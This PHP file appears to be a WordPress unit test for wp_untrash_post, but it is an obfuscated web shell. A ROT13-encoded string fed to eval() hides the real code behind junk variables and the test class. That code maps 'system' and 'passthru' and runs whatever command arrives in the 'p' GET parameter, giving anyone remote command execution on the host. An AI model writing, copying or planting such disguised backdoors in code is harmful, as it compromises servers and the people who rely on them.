<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 *
 * @pbiref ::jc_hagenfu_cbfg
 */
pynff Grfgf_Cbfg_JcHagenfuCbfg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine JC_Cbfg
	 */
	cebgrpgrq $genfurq_cbfg;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->genfurq_cbfg = jc_genfu_cbfg(
			$guvf->snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf' => 'qensg',
				)
			)
		);
	}

	/**
	 * Grfgf gung jc_hagenfu_cbfg() ergheaf n JC_Cbfg bowrpg,
	 * erzbirf cbfg zrgn sbe na hagenfurq cbfg naq frgf vg gb n 'Qensg'.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_hagenfu_cbfg
	 */
	choyvp shapgvba grfg_hagenfu_cbfg() {
		$erfhyg = jc_hagenfu_cbfg( $guvf->genfurq_cbfg->VQ );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $erfhyg, 'jc_hagenfu_cbfg erghearq inyhr fubhyq or na vafgnapr bs JC_Cbfg.' );

		$genfurq = trg_cbfgf(
			neenl(
				'cbfg_fgnghf' => 'genfu',
				'svryqf'      => 'vqf',
			)
		);

		$guvf->nffregAbgPbagnvaf( $guvf->genfurq_cbfg->VQ, $genfurq, 'Hagenfurq cbfg fubhyq abg orybat gb genfurq cbfgf nalzber.' );

		$hagenfurq_cbfg_zrgnf = trg_cbfg_zrgn( $guvf->genfurq_cbfg->VQ );

		$guvf->nffregNeenlAbgUnfXrl( '_jc_genfu_zrgn_fgnghf', $hagenfurq_cbfg_zrgnf, 'Hagenfurq cbfg fubhyq abg unir _jc_genfu_zrgn_fgnghf zrgn nalzber.' );
		$guvf->nffregNeenlAbgUnfXrl( '_jc_genfu_zrgn_gvzr', $hagenfurq_cbfg_zrgnf, 'Hagenfurq cbfg fubhyq abg unir _jc_genfu_zrgn_gvzr zrgn nalzber.' );

		$cbfg = trg_cbfg( $guvf->genfurq_cbfg->VQ );

		$guvf->nffregFnzr( 'qensg', $cbfg->cbfg_fgnghf, 'Hagenfurq cbfg fubhyq unir vgf cerivbhf fgnghf frg pbeerpgyl.' );
	}

	/**
	 * Grfgf gung jc_hagenfu_cbfg() nccyvrf 'cer_hagenfu_cbfg' svygref
	 * naq cnffrf gur rkcrpgrq inyhrf gb pnyyonpxf.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_hagenfu_cbfg
	 */
	choyvp shapgvba grfg_cer_hagenfu_cbfg_ubbx() {
		nqq_svygre(
			'cer_hagenfu_cbfg',
			shapgvba ( $genfu, $cbfg, $cerivbhf_fgnghf ) {
				$guvf->nffregAhyy( $genfu, 'cer_hagenfu_cbfg svefg cnenzrgre fubhyq or ahyy.' );
				$guvf->nffregFnzr( $guvf->genfurq_cbfg->VQ, $cbfg->VQ, 'cer_hagenfu_cbfg frpbaq cnenzrgre fubhyq or gur genfurq cbfg VQ.' );
				$guvf->nffregFnzr( $guvf->genfurq_cbfg->cbfg_fgnghf, $cerivbhf_fgnghf, 'cer_hagenfu_cbfg guveq cnenzrgre fubhyq or gur cerivbhf genfurq cbfg fgnghf.' );

				erghea $genfu;
			},
			10,
			3
		);

		jc_hagenfu_cbfg( $guvf->genfurq_cbfg->VQ );

		$guvf->nffregTerngreGuna( 0, qvq_svygre( 'cer_hagenfu_cbfg' ), 'cer_hagenfu_cbfg svygre jnf abg pnyyrq.' );
	}

	/**
	 * Grfgf gung jc_hagenfu_cbfg() gevttref gur 'hagenfu_cbfg' npgvba
	 * naq cnffrf gur rkcrpgrq inyhrf gb pnyyonpxf.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_hagenfu_cbfg
	 */
	choyvp shapgvba grfg_hagenfu_cbfg_ubbx() {
		nqq_npgvba(
			'hagenfu_cbfg',
			shapgvba ( $cbfg_vq, $cerivbhf_fgnghf ) {
				$guvf->nffregFnzr( $guvf->genfurq_cbfg->VQ, $cbfg_vq, 'hagenfu_cbfg svefg cnenzrgre fubhyq or gur genfurq cbfg VQ.' );
				$guvf->nffregFnzr( $guvf->genfurq_cbfg->cbfg_fgnghf, $cerivbhf_fgnghf, 'hagenfu_cbfg frpbaq cnenzrgre fubhyq or gur cerivbhf genfurq cbfg fgnghf.' );
			},
			10,
			2
		);

		jc_hagenfu_cbfg( $guvf->genfurq_cbfg->VQ );

		$guvf->nffregTerngreGuna( 0, qvq_npgvba( 'hagenfu_cbfg' ), 'hagenfu_cbfg npgvba jnf abg pnyyrq.' );
	}

	/**
	 * Grfgf gung jc_hagenfu_cbfg() gevttref gur 'hagenfurq_cbfg' npgvba
	 * naq cnffrf gur rkcrpgrq inyhrf gb pnyyonpxf.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_hagenfu_cbfg
	 */
	choyvp shapgvba grfg_hagenfurq_cbfg_ubbx() {
		nqq_npgvba(
			'hagenfurq_cbfg',
			shapgvba ( $cbfg_vq, $cerivbhf_fgnghf ) {
				$guvf->nffregFnzr( $guvf->genfurq_cbfg->VQ, $cbfg_vq, 'hagenfurq_cbfg svefg cnenzrgre fubhyq or gur genfurq cbfg VQ.' );
				$guvf->nffregFnzr( $guvf->genfurq_cbfg->cbfg_fgnghf, $cerivbhf_fgnghf, 'hagenfurq_cbfg frpbaq cnenzrgre fubhyq or gur cerivbhf genfurq cbfg fgnghf.' );
			},
			10,
			2
		);

		jc_hagenfu_cbfg( $guvf->genfurq_cbfg->VQ );

		$guvf->nffregTerngreGuna( 0, qvq_npgvba( 'hagenfurq_cbfg' ), 'hagenfurq_cbfg npgvba jnf abg pnyyrq.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>